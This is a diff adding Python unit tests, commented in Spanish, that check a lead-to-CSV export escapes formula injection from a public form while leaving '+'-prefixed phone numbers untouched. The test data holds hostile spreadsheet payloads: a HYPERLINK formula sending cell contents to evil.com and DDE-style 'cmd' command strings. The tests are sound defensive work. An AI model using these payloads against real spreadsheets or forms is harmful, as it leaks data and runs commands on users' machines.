@@ -44,3 +44,34 @@ def test_valores_ausentes_quedan_vacios():
     filas = _parsear(leads_to_csv([{"name": "C", "email": "c@x.com"}]))
     fila = filas[1]
     assert fila[0] == "C" and fila[4] == "" and fila[5] == "" and fila[6] == ""
+
+
+# ── CSV/Formula Injection: los campos vienen del formulario público sin auth ──
+
+def test_formula_injection_se_neutraliza_con_apostrofo():
+    lead = {
+        "name": '=HYPERLINK("http://evil.com?"&A1)',
+        "email": "-cmd|'/c calc'!A1",
+        "phone": "+34 600,111",  # NO debe sanearse: es un teléfono real
+        "message": "@SUM(1+1)*cmd|'/c calc'!A1",
+    }
+    filas = _parsear(leads_to_csv([lead]))
+    nombre, email, telefono, mensaje = filas[1][0], filas[1][1], filas[1][2], filas[1][7]
+    assert nombre.startswith("'=") and nombre.endswith(")")
+    assert email.startswith("'-")
+    assert telefono == "+34 600,111"
+    assert mensaje.startswith("'@")
+
+
+def test_valores_normales_no_llevan_apostrofo():
+    lead = {"name": "Ana Pérez", "email": "ana@x.com", "phone": "612345678", "message": "Hola, quiero info"}
+    filas = _parsear(leads_to_csv([lead]))
+    assert filas[1][0] == "Ana Pérez" and filas[1][1] == "ana@x.com" and filas[1][2] == "612345678"
+
+
+def test_telefono_internacional_no_se_sanea():
+    """Regresión: el teléfono no debe llevar apóstrofo aunque empiece por
+    '+' (formato internacional estándar, ej. números de España)."""
+    lead = {"name": "B", "email": "b@x.com", "phone": "+34 600 111 222", "message": "info"}
+    filas = _parsear(leads_to_csv([lead]))
+    assert filas[1][2] == "+34 600 111 222"
